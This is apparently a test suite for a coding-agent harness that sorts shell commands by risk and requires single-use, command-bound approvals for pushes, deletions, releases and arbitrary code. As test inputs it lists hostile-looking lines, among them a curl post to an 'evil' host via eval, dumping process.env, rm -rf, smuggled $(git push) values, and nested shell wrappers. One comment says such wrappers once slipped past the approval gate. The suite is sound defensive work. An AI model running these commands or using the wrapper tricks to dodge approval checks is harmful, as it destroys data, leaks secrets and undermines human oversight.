import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'

import { afterEach, describe, expect, test } from 'bun:test'

import {
  ChangeOwnershipService,
  HarnessApprovalService,
  classifyCapturedTargetForExecution,
  classifyHarnessArgv,
  classifyTerminalHarnessAction,
  evaluateHarnessActionPolicy,
  hashCommand,
  prepareHarnessGitReadArgv,
} from '../services/harness-enforcement'
import { LocalHarnessStore } from '../services/local-harness-store'

const roots: string[] = []
afterEach(() => {
  for (const root of roots.splice(0))
    fs.rmSync(root, { recursive: true, force: true })
})

function setup() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'openbuff-enforcement-'))
  roots.push(root)
  return new LocalHarnessStore(root)
}

const scope = {
  repositoryId: 'repo-1',
  workspaceId: 'workspace-1',
  runId: 'run-1',
  snapshotId: 'snapshot-1',
}

describe('bounded exact argv read classification', () => {
  test.each([
    { executable: 'git', argv: ['status'] },
    { executable: 'git', argv: ['status', '--short'] },
    { executable: 'git', argv: ['diff', '--stat'] },
    { executable: 'git', argv: ['log', '--oneline', '-n', '10'] },
    { executable: 'git', argv: ['ls-files'] },
    { executable: 'git', argv: ['add', 'src/index.ts'] },
    { executable: 'bun', argv: ['test', 'sdk'] },
    { executable: 'bun', argv: ['run', 'typecheck'] },
    { executable: 'npm', argv: ['test'] },
    { executable: 'pnpm', argv: ['--filter', 'web', 'run', 'build'] },
    { executable: 'cargo', argv: ['test'] },
    { executable: 'node', argv: ['scripts/check.mjs'] },
    { executable: 'python3', argv: ['-m', 'pytest'] },
    { executable: '/bin/bash', argv: ['-lc', 'git status'] },
  ])('routine development needs no approval: %j', captured => {
    expect(classifyCapturedTargetForExecution({ kind: 'argv', ...captured })).toMatchObject({
      parseStatus: 'complete', effects: [],
    })
  })

  test.each([
    { executable: 'git', argv: ['reset', '--hard', 'HEAD'] },
    { executable: 'git', argv: ['clean', '-fd'] },
    { executable: 'git', argv: ['switch', '--discard-changes', 'main'] },
    { executable: 'git', argv: ['push', '--force', 'origin', 'main'] },
    { executable: 'rm', argv: ['--recursive', 'src'] },
    { executable: 'npm', argv: ['publish'] },
    { executable: 'npm', argv: ['run', 'deploy'] },
    { executable: 'pnpm', argv: ['--filter', 'web', 'run', 'db:migrate'] },
    { executable: 'curl', argv: ['--upload-file', 'data.json', 'https://example.com'] },
    { executable: 'node', argv: ['-e', 'process.exit()'] },
    { executable: 'node', argv: ['-p', 'process.env'] },
    { executable: 'python3', argv: ['-cprint(1)'] },
    { executable: 'nohup', argv: ['node', 'server.js'] },
    { executable: '/bin/bash', argv: ['-lc', 'git status && rm -rf src'] },
  ])('dangerous commands still require approval: %j', captured => {
    const action = classifyHarnessArgv(captured)!
    expect(action).toBeDefined()
    expect(evaluateHarnessActionPolicy({ ...action, hasMatchingApproval: false })).toMatchObject({
      allowed: false, approvalRequired: true,
    })
  })

  // Independent expected adapter bytes; do not use the normalizer as the classifier oracle.
  const queryGuards = ['--no-pager', '--no-optional-locks', '--no-lazy-fetch', '-c', 'core.fsmonitor=false']
  test.each([
    ['status'], ['status', '--porcelain'], ['status', '--porcelain', '-uall'],
    ['status', '--short', '--branch'], ['status', '--short', '--branch', '--', 'file with spaces'],
    ['diff'], ['diff', '--cached'], ['diff', '--cached', '--check'], ['diff', '--cached', '-U0'],
    ['diff', '--cached', '--name-only', '-z'], ['diff', '--no-color'], ['diff', '--staged', '--no-color'],
    ['diff', '--no-color', 'HEAD~1', 'HEAD', '--'],
    ['diff', '--binary', 'HEAD', '--', '.', ':(exclude).agents/sessions/**'],
    ['diff', '--no-color', '--', '--ext-diff', 'literal; $(git push)'],
    ['branch', '--show-current'], ['rev-parse', '--show-toplevel'], ['rev-parse', '--git-common-dir'],
    ['rev-parse', '--git-dir'], ['rev-parse', 'HEAD'], ['rev-parse', 'HEAD~1'],
    ['rev-parse', '--verify', 'HEAD'], ['rev-parse', '--verify', 'HEAD~1'],
    ['rev-parse', '--abbrev-ref', 'HEAD'],
    ['rev-parse', '--abbrev-ref', '--symbolic-full-name', '@{upstream}'],
    ['symbolic-ref', '--quiet', '--short', 'refs/remotes/origin/HEAD'], ['merge-base', 'HEAD', 'origin/main'],
    ['shortlog', 'HEAD~10..HEAD'],
  ].map(argv => ({ argv })))('captures guarded Git adapter query semantics: %j', ({ argv }) => {
    const identity = argv[0] === 'rev-parse' && ['--show-toplevel', '--git-common-dir', '--git-dir'].includes(argv[1])
    const expected = identity ? argv : [...queryGuards, argv[0],
      ...(argv[0] === 'diff' ? ['--no-ext-diff', '--no-textconv', '--submodule=short'] : []), ...argv.slice(1)]
    const before = [...argv]
    expect(prepareHarnessGitReadArgv(argv)).toEqual(expected)
    expect(prepareHarnessGitReadArgv(expected)).toEqual(expected)
    expect(argv).toEqual(before)
    const classification = classifyCapturedTargetForExecution({ kind: 'argv', executable: 'git', argv: expected })
    expect(classifyHarnessArgv({ executable: 'git', argv: expected })).toBeUndefined()
    expect(classification).toMatchObject({
      invocationKind: 'argv', classifierVersion: 'b18-argv-adapter-v1',
      effects: [], parseStatus: 'complete', parseReason: null,
    })
  })

  test.each([
    { executable: 'rg', argv: ['--no-config', '-n', '--json', '-g', '*.ts', '-C', '2', '--', 'a  b; $(git push)', 'src'] },
    { executable: 'rg', argv: ['--no-config', '-l', '--glob=*.ts', '-A2', '--', '--pre', 'file with spaces'] },
    { executable: 'grep', argv: ['-n', '-E', '--', 'a  b; $(git push)', 'file with spaces'] },
    { executable: 'grep', argv: ['-e', '--pre', 'file with spaces'] },
    { executable: 'cat', argv: ['--', '--unknown-option', 'literal; $(git push)'] },
    { executable: 'head', argv: ['-n', '20', 'file with spaces'] },
    { executable: 'tail', argv: ['--lines=20', 'file with spaces'] },
    { executable: 'wc', argv: ['-l', 'file with spaces'] },
    { executable: 'ls', argv: ['-la', 'file with spaces'] },
    { executable: 'pwd', argv: [] }, { executable: 'echo', argv: ['literal; $(git push)'] },
    { executable: 'node', argv: ['--version'] }, { executable: 'git', argv: ['--version'] },
    { executable: 'go', argv: ['version'] }, { executable: 'java', argv: ['-version'] },
  ])('keeps supported read tokens complete: %j', captured => {
    const before = [...captured.argv]
    expect(classifyHarnessArgv(captured)).toBeUndefined()
    expect(classifyCapturedTargetForExecution({ kind: 'argv', ...captured })).toMatchObject({
      effects: [], parseStatus: 'complete', parseReason: null,
    })
    expect([...captured.argv]).toEqual(before)
  })

  test.each([
    { executable: 'rg', argv: ['--no-config', '--pre', 'node processor.js', '--', 'needle', 'src'] },
    { executable: 'rg', argv: ['--no-config', '--pre=node processor.js', '--', 'needle', 'src'] },
    { executable: 'rg', argv: ['--pre', 'node processor.js', '--', 'needle', 'src'] },
    { executable: 'rg', argv: ['--no-config', '-x', '--', 'needle', 'src'] },
    { executable: 'rg', argv: ['--no-config', '--unknown=processor', '--', 'needle', 'src'] },
    { executable: 'rg', argv: ['--no-config', '--glob'] },
    { executable: 'rg', argv: ['--no-config', '--glob', '--', 'needle'] },
    { executable: 'rg', argv: ['--no-config', '-C', 'not-a-count', '--', 'needle'] },
    { executable: 'rg', argv: ['-n', 'needle', 'src'] },
    { executable: 'git', argv: ['diff', '--ext-diff'] },
    { executable: 'git', argv: ['--no-pager', '--no-optional-locks', '-c', 'core.fsmonitor=false', 'diff', '--no-ext-diff', '--no-textconv', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'diff', '--no-ext-diff', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'diff', '--no-textconv', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'diff', '--no-ext-diff', '--no-textconv', '--submodule=diff', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'diff', '--no-ext-diff', '--no-textconv', '--submodule=short', '--textconv', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'diff', '--no-ext-diff', '--no-textconv', '--submodule=short', '--ext-diff', '--cached'] },
    { executable: 'git', argv: [...queryGuards, '-c', 'core.fsmonitor=processor', 'status'] },
    { executable: 'git', argv: [...queryGuards, '--paginate', 'diff', '--no-ext-diff', '--no-textconv', '--cached'] },
    { executable: 'git', argv: [...queryGuards, 'show', '--no-ext-diff', '--no-textconv', 'HEAD'] },
    { executable: 'git', argv: ['diff', '--ext-diff', '--', 'src'] },
    { executable: 'git', argv: ['diff', '--ext-diff=processor'] },
    { executable: 'git', argv: ['diff', '--textconv'] },
    { executable: 'git', argv: ['diff', '--textconv=processor', '--', 'src'] },
    { executable: 'git', argv: ['show', '--textconv', 'HEAD:src/a.ts'] },
    { executable: 'git', argv: ['log', '--ext-diff', '-p'] },
    { executable: 'git', argv: ['diff', '--output', '/tmp/not-written'] },
    { executable: 'git', argv: ['diff', '-O', 'order-file'] },
    { executable: 'git', argv: ['diff', '--unknown-option', '--', 'src'] },
    { executable: 'git', argv: ['status', '--unknown=one'] },
    { executable: 'git', argv: ['rev-parse', '--show-toplevel', 'HEAD'] },
    { executable: 'git', argv: ['branch', '--show-current', '--unknown'] },
    { executable: 'git', argv: ['remote', 'get-url', 'origin', '--unknown'] },
    { executable: 'git', argv: ['config', '--get', 'key', '--unknown'] },
    { executable: 'grep', argv: ['needle', '--unknown-option', 'src'] },
    { executable: 'grep', argv: ['-x', 'needle', 'src'] },
    { executable: 'head', argv: ['-n'] }, { executable: 'tail', argv: ['-f', 'file'] },
    { executable: 'cat', argv: ['--unknown-option', 'file'] },
    { executable: 'ls', argv: ['--unknown-option', 'src'] },
    { executable: 'wc', argv: ['--unknown-option', 'file'] },
    { executable: 'find', argv: ['.', '-fprintf', '/tmp/not-written', '%p'] },
    { executable: 'go', argv: ['version', '--unknown'] },
    { executable: 'java', argv: ['-version', '--unknown'] },
  ])('retains unsupported or programmable argv under B18: %j', captured => {
    const classification = classifyCapturedTargetForExecution({ kind: 'argv', ...captured })
    expect(classification.parseStatus).toBe('unsupported')
    expect(classification.parseReason).toBeTruthy()
    expect(classification.effects.map(effect => effect.action)).toEqual(['arbitrary-code'])
    const action = classifyHarnessArgv(captured)!
    expect(action.commandHash).toBe(hashCommand(JSON.stringify(['openbuff.argv-command.v1', captured.executable, captured.argv])))
    expect(evaluateHarnessActionPolicy({ ...action, hasMatchingApproval: false })).toMatchObject({
      allowed: false, approvalRequired: true,
    })
    expect(evaluateHarnessActionPolicy({ ...action, hasMatchingApproval: false, approvalMode: 'allow-all' })).toEqual({
      allowed: true, approvalRequired: false,
    })
    expect(evaluateHarnessActionPolicy({ ...action, hasMatchingApproval: true })).toEqual({
      allowed: true, approvalRequired: false,
    })
  })

  test('literal preprocessor bytes stay a pattern while a separate option is unsupported', () => {
    const operand = ['--no-config', '-n', '--json', '--', '--pre node processor.js', 'src']
    const option = ['--no-config', '-n', '--json', '--pre', 'node processor.js', '--', 'needle', 'src']
    expect(classifyCapturedTargetForExecution({ kind: 'argv', executable: 'rg', argv: operand })).toMatchObject({
      effects: [], parseStatus: 'complete', parseReason: null,
    })
    expect(classifyCapturedTargetForExecution({ kind: 'argv', executable: 'rg', argv: option })).toMatchObject({
      parseStatus: 'unsupported', effects: [{ action: 'arbitrary-code' }],
    })
  })

  test.each([
    ['commit', '-m', 'user hooks remain enabled'], ['checkout', '-b', 'user-branch'],
    ['diff', '--ext-diff'], ['-c', 'diff.external=processor', 'diff'], ['--paginate', 'log'],
    ['diff', '--unknown-option'],
  ].map(argv => ({ argv })))('does not rewrite mutations or unsupported user query vectors: %j', ({ argv }) => {
    expect(prepareHarnessGitReadArgv(argv)).toEqual(argv)
    expect(prepareHarnessGitReadArgv(argv)).not.toBe(argv)
  })
})

describe('harness enforcement services', () => {
  test('approvals are exact-scope and single-use', () => {
    const service = new HarnessApprovalService(setup())
    const grant = service.grant(scope, {
      action: 'push',
      target: 'origin/feature',
      commandHash: hashCommand('git push origin feature'),
    })
    expect(() =>
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/other',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: 'snapshot-1',
      }),
    ).toThrow('scope does not match')
    expect(
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: 'snapshot-1',
      }).consumedAt,
    ).toBeDefined()
    expect(() =>
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: 'snapshot-1',
      }),
    ).toThrow('already consumed')
  })

  test('approvals bind to the exact command hash', () => {
    const service = new HarnessApprovalService(setup())
    const grant = service.grant(scope, {
      action: 'push',
      target: 'origin/feature',
      commandHash: hashCommand('git push origin feature'),
    })
    // A command that classifies to the same action+target but is a DIFFERENT
    // command (different hash) must NOT consume the approval.
    expect(() =>
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push --force origin feature'),
        snapshotId: 'snapshot-1',
      }),
    ).toThrow('scope does not match')
    // The identical command's hash consumes it exactly once.
    expect(
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: 'snapshot-1',
      }).consumedAt,
    ).toBeDefined()
  })

  test('consume rejects expired approvals, including a malformed expiresAt', () => {
    const service = new HarnessApprovalService(setup())
    const consumeGrant = (grant: ReturnType<HarnessApprovalService['grant']>) =>
      service.consume({
        repositoryId: scope.repositoryId,
        workspaceId: scope.workspaceId,
        runId: scope.runId,
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: scope.snapshotId,
      })

    // A well-formed past expiresAt must reject the consume.
    const expired = service.grant(scope, {
      action: 'push',
      target: 'origin/feature',
      commandHash: hashCommand('git push origin feature'),
      expiresAt: new Date(Date.now() - 1000).toISOString(),
    })
    expect(() => consumeGrant(expired)).toThrow('Approval has expired.')

    // A malformed (non-ISO) expiresAt must fail closed the same way: it must
    // never be treated as never-expiring.
    const malformed = service.grant(scope, {
      action: 'push',
      target: 'origin/feature',
      commandHash: hashCommand('git push origin feature'),
      expiresAt: 'not-a-timestamp',
    })
    expect(() => consumeGrant(malformed)).toThrow('Approval has expired.')
  })

  test('hashCommand preserves exact command whitespace', () => {
    expect(hashCommand('git  push   origin feature')).not.toBe(
      hashCommand('git push origin feature'),
    )
  })

  test('ownership receipts reject traversal and duplicate paths', () => {
    const service = new ChangeOwnershipService(setup())
    expect(() =>
      service.record(scope, {
        transactionId: 'tx-1',
        agentRole: 'editor',
        findingsAddressed: [],
        requirementsAddressed: [],
        changes: [{ path: '../secret', ownership: 'agent' }],
      }),
    ).toThrow('Invalid ownership path')
  })

  test('policy supports balanced, strict, and allow-all approval modes', () => {
    expect(
      evaluateHarnessActionPolicy({
        action: 'release',
        target: 'v1.0.0',
        hasMatchingApproval: false,
      }),
    ).toMatchObject({ allowed: false, approvalRequired: true })
    expect(
      evaluateHarnessActionPolicy({
        action: 'dependency-install',
        target: 'bun install',
        hasMatchingApproval: false,
      }),
    ).toEqual({ allowed: true, approvalRequired: false })
    expect(
      evaluateHarnessActionPolicy({
        action: 'dependency-install',
        target: 'bun install',
        hasMatchingApproval: false,
        approvalMode: 'strict',
      }),
    ).toMatchObject({ allowed: false, approvalRequired: true })
    expect(
      evaluateHarnessActionPolicy({
        action: 'deploy',
        target: 'kubectl apply -f deploy.yaml',
        hasMatchingApproval: false,
        approvalMode: 'allow-all',
      }),
    ).toEqual({ allowed: true, approvalRequired: false })
    expect(
      evaluateHarnessActionPolicy({
        action: 'push',
        target: 'origin/main',
        branch: 'main',
        defaultBranch: 'main',
        hasMatchingApproval: false,
      }),
    ).toMatchObject({ allowed: false, approvalRequired: true })
    expect(
      evaluateHarnessActionPolicy({
        action: 'pull-request',
        target: 'gh pr create --title test',
        hasMatchingApproval: false,
      }),
    ).toEqual({ allowed: true, approvalRequired: false })
  })

  test('classifies only recognized high-impact command shapes', () => {
    expect(
      classifyTerminalHarnessAction('git push -u origin feature/x'),
    ).toMatchObject({
      action: 'push',
      target: 'origin/feature/x',
      branch: 'feature/x',
      commandHash: hashCommand('git push -u origin feature/x'),
    })
    expect(classifyTerminalHarnessAction('git push')).toMatchObject({
      action: 'push',
      target: 'git push',
      commandHash: hashCommand('git push'),
    })
    expect(
      classifyTerminalHarnessAction('git push origin HEAD:main'),
    ).toMatchObject({
      action: 'push',
      target: 'origin/main',
      branch: 'main',
      commandHash: hashCommand('git push origin HEAD:main'),
    })
    expect(
      classifyTerminalHarnessAction('git push --force origin main'),
    ).toMatchObject({
      action: 'push',
      target: 'git push --force origin main',
      branch: 'main',
      commandHash: hashCommand('git push --force origin main'),
    })
    expect(classifyTerminalHarnessAction('pnpm add zod')).toMatchObject({
      action: 'dependency-install',
    })
    expect(classifyTerminalHarnessAction('git commit -m test')).toMatchObject({
      action: 'commit',
    })
    expect(classifyTerminalHarnessAction('find src -delete')).toMatchObject({
      action: 'workspace-delete',
    })
    expect(classifyTerminalHarnessAction('node -e "fetch(url)"')).toMatchObject(
      {
        action: 'arbitrary-code',
      },
    )
    expect(
      classifyTerminalHarnessAction('git restore --staged src/a.ts'),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('git restore --staged -- src/a.ts'),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('git restore --staged src/a.ts src/b.ts'),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('git restore --worktree src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(classifyTerminalHarnessAction('git restore src/a.ts')).toMatchObject(
      { action: 'workspace-delete' },
    )
    expect(
      classifyTerminalHarnessAction('git restore --staged --worktree src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git restore -W src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git restore --source=HEAD~1 src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git restore -p src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git restore --patch src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git restore --staged -W src/a.ts'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('git reset --hard HEAD'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction(
        'bun test packages/foo && bun run typecheck',
      ),
    ).toBeUndefined()
    expect(classifyTerminalHarnessAction('echo $(pwd)')).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('git log --oneline $(git rev-parse HEAD)'),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction(
        'set -o pipefail; (bun test) 2>&1 | tee /tmp/log | head -20',
      ),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction(
        'set -o pipefail; (bun test sdk) 2>&1 | tee /tmp/openbuff-basher-x.log >/dev/null; status=${PIPESTATUS[0]}; echo exit_status=$status; grep -n -E \'\\(fail\\)|error:\' /tmp/x.log | head -120 || true; exit "$status"',
      ),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction(
        "which blender && blender --version 2>/dev/null | head -3; echo '---'; ls -la public/models/ 2>/dev/null || true",
      ),
    ).toBeUndefined()
    expect(classifyTerminalHarnessAction('bun run dev &')).toBeUndefined()
    expect(classifyTerminalHarnessAction('echo `pwd`')).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('echo "$(git rev-parse --short HEAD)"'),
    ).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('gh pr create --title test'),
    ).toMatchObject({
      action: 'pull-request',
      target: 'gh pr create --title test',
      commandHash: hashCommand('gh pr create --title test'),
    })
    expect(classifyTerminalHarnessAction('bun test')).toBeUndefined()
    expect(classifyTerminalHarnessAction('nohup bun test')).toMatchObject({
      action: 'arbitrary-code',
    })
    expect(
      classifyTerminalHarnessAction("python3 -c 'print(1)'"),
    ).toMatchObject({ action: 'arbitrary-code' })
    expect(classifyTerminalHarnessAction('git clean -fd')).toMatchObject({
      action: 'workspace-delete',
    })
  })

  test('classifies dangerous commands hidden behind harmless segments', () => {
    expect(
      classifyTerminalHarnessAction('cd x && git push origin main'),
    ).toMatchObject({
      action: 'push',
      target: 'origin/main',
      branch: 'main',
      commandHash: hashCommand('cd x && git push origin main'),
    })
    expect(
      classifyTerminalHarnessAction('true && sudo git commit -m x'),
    ).toMatchObject({ action: 'commit' })
    expect(classifyTerminalHarnessAction('echo ok; npm publish')).toMatchObject(
      {
        action: 'release',
      },
    )
    expect(classifyTerminalHarnessAction('echo "$(git push)"')).toMatchObject({
      action: 'push',
    })
    expect(
      classifyTerminalHarnessAction('ls | xargs rm -rf build'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(
      classifyTerminalHarnessAction('FOO=1 git reset --hard'),
    ).toMatchObject({ action: 'workspace-delete' })
    expect(classifyTerminalHarnessAction('(git clean -fd)')).toMatchObject({
      action: 'workspace-delete',
    })
    expect(classifyTerminalHarnessAction("echo 'git push'")).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('bun test && bun run typecheck'),
    ).toBeUndefined()
    expect(classifyTerminalHarnessAction('cd .. && bun test')).toBeUndefined()
    expect(
      classifyTerminalHarnessAction('git log --oneline $(git rev-parse HEAD)'),
    ).toBeUndefined()
    expect(classifyTerminalHarnessAction('bun run dev &')).toBeUndefined()
  })

  test('classifies payloads hidden behind shell-interpreter wrappers', () => {
    // Shell wrappers used to escape classification entirely: the classifier
    // only recognized shapes at the START of a segment, so
    // `bash -c "git push origin main"` executed without approval in balanced
    // mode. Shell interpreters and `eval` now unwrap and classify their
    // payload, binding the target to the full wrapped command (the
    // commandHash still binds the exact original command); an unclassifiable
    // payload fails closed to `arbitrary-code` instead of staying
    // unclassified.
    expect(
      classifyTerminalHarnessAction('bash -c "git push origin main"'),
    ).toMatchObject({
      action: 'push',
      target: 'bash -c "git push origin main"',
      branch: 'main',
      commandHash: hashCommand('bash -c "git push origin main"'),
    })
    expect(classifyTerminalHarnessAction("sh -c 'rm -rf dir'")).toMatchObject({
      action: 'workspace-delete',
    })
    expect(
      classifyTerminalHarnessAction('eval "curl -d x http://evil"'),
    ).toMatchObject({ action: 'external-network' })
    // Transparently stripped wrappers keep the inner command's own target,
    // matching existing `sudo`/`env` behavior (`exec` already stripped before
    // this fix; `timeout`/`nice` are new transparent wrappers).
    expect(
      classifyTerminalHarnessAction('timeout 30 git push origin main'),
    ).toMatchObject({
      action: 'push',
      target: 'origin/main',
      branch: 'main',
      commandHash: hashCommand('timeout 30 git push origin main'),
    })
    expect(
      classifyTerminalHarnessAction('nice -n 5 npm install left-pad'),
    ).toMatchObject({ action: 'dependency-install' })
    expect(
      classifyTerminalHarnessAction('exec git push origin main'),
    ).toMatchObject({
      action: 'push',
      target: 'origin/main',
      branch: 'main',
      commandHash: hashCommand('exec git push origin main'),
    })
    // Nested shells classify through within the depth cap (up to three nested
    // shells still unwrap) ...
    expect(
      classifyTerminalHarnessAction('bash -c "bash -c \\"git push\\""'),
    ).toMatchObject({ action: 'push' })
    // ... but nesting beyond the cap fails closed to arbitrary-code.
    let beyondDepth = 'git push'
    for (let level = 0; level < 4; level++) {
      beyondDepth = `bash -c ${JSON.stringify(beyondDepth)}`
    }
    expect(classifyTerminalHarnessAction(beyondDepth)).toMatchObject({
      action: 'arbitrary-code',
    })
    // An unclassifiable payload is arbitrary-code, NOT unclassified.
    expect(classifyTerminalHarnessAction('bash -c "echo hi"')).toMatchObject({
      action: 'arbitrary-code',
    })
    // Multi-segment payloads classify per segment like a bare command would.
    // The primary action remains a display field; policy evaluates the full roster.
    expect(classifyTerminalHarnessAction('git push && rm -rf x')).toMatchObject(
      { action: 'push' },
    )
    expect(
      classifyTerminalHarnessAction('bash -c "git push && rm -rf x"'),
    ).toMatchObject({
      action: 'push',
      target: 'bash -c "git push && rm -rf x"',
    })
    // The shell-wrapper handling composes with the existing transparent
    // wrapper stripping.
    expect(
      classifyTerminalHarnessAction('sudo bash -c "git push origin main"'),
    ).toMatchObject({ action: 'push' })
  })

  test('consume observes a concurrent consumer through the kind lock', () => {
    const store = setup()
    const service = new HarnessApprovalService(store)
    const grant = service.grant(scope, {
      action: 'push',
      target: 'origin/feature',
      commandHash: hashCommand('git push origin feature'),
    })
    // A parallel consumer holds the approvals kind lock, consumes the grant,
    // and commits the consumed revision inside the critical section. Our
    // consume must then observe the committed record and fail closed with the
    // documented single-use error instead of consuming a second time.
    const consumedAt = new Date().toISOString()
    store.withKindLock(scope.repositoryId, 'approvals', () => {
      store.put(
        'approvals',
        {
          ...grant,
          revision: grant.revision + 1,
          updatedAt: consumedAt,
          consumedAt,
        },
        grant.revision,
      )
    })
    expect(() =>
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/feature',
        commandHash: hashCommand('git push origin feature'),
        snapshotId: 'snapshot-1',
      }),
    ).toThrow('already consumed')
  })

  test('exactly one consume wins across repeated attempts', () => {
    const service = new HarnessApprovalService(setup())
    const grant = service.grant(scope, {
      action: 'push',
      target: 'origin/main',
      commandHash: hashCommand('git push origin main'),
    })
    const consume = () =>
      service.consume({
        repositoryId: 'repo-1',
        workspaceId: 'workspace-1',
        runId: 'run-1',
        approvalId: grant.id,
        action: 'push',
        target: 'origin/main',
        commandHash: hashCommand('git push origin main'),
        snapshotId: 'snapshot-1',
      })
    const attempts = Array.from({ length: 8 }, () => {
      try {
        return { ok: true as const, record: consume() }
      } catch (error) {
        return { ok: false as const, error }
      }
    })
    const successes = attempts.filter((attempt) => attempt.ok)
    expect(successes.length).toBe(1)
    expect(successes[0]?.record.consumedAt).toBeDefined()
    for (const attempt of attempts) {
      if (!attempt.ok) {
        expect(String(attempt.error)).toMatch(/already consumed/)
      }
    }
  })

  test('a non-EEXIST acquire failure never deletes a competing holder lock', () => {
    const store = setup()
    const lockDir = path.join(
      store.rootDir,
      scope.repositoryId,
      'approvals.lock',
    )
    // Simulate a competing waiter that already acquired the kind lock.
    fs.mkdirSync(lockDir, { recursive: true })
    const ownerFilePath = path.join(lockDir, 'owner.json')
    fs.writeFileSync(
      ownerFilePath,
      JSON.stringify({ pid: process.pid, token: 'victim-token' }),
    )

    // Force the acquire's mkdir to fail with a non-EEXIST error (EMFILE),
    // the way an environment refusal (EACCES/ENOSPC/...) would.
    const realMkdirSync = fs.mkdirSync
    fs.mkdirSync = ((
      target: fs.PathLike,
      options?: fs.MakeDirectoryOptions,
    ) => {
      if (target === lockDir) {
        const error = new Error(
          'simulated acquire failure',
        ) as NodeJS.ErrnoException
        error.code = 'EMFILE'
        throw error
      }
      return realMkdirSync(target, options)
    }) as typeof fs.mkdirSync
    try {
      expect(() =>
        store.withKindLock(scope.repositoryId, 'approvals', () => {}),
      ).toThrow('simulated acquire failure')
    } finally {
      fs.mkdirSync = realMkdirSync
    }

    // The competing holder's lock dir and owner record must survive: the
    // failed acquirer must never delete a lock it does not own.
    expect(fs.existsSync(lockDir)).toBe(true)
    const owner = JSON.parse(fs.readFileSync(ownerFilePath, 'utf8')) as {
      token?: unknown
    }
    expect(owner.token).toBe('victim-token')
  })
})
